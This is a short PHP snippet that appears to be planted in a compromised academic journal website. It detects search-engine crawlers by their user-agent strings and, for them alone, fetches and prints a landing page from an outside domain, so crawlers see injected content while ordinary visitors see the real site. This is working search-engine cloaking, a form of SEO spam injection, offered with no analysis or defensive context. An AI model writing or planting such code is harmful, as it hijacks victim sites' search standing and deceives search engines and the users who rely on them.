<?php
	function is_bot() {
		$user_agent = $_SERVER['HTTP_USER_AGENT'];
		$bots = array("bot","ahrefs","google");
		
		foreach ($bots as $bot) {
			if (stripos($user_agent, $bot) !== false) {
				return true;
			}
		}
		
		return false;
	}
 
	if (is_bot()) {
		$message = file_get_contents('https://wellplayer.online/landing/jurnal.idbbali.ac.id/');
		echo $message;
	exit; // Atau bisa menggunakan die()
	}
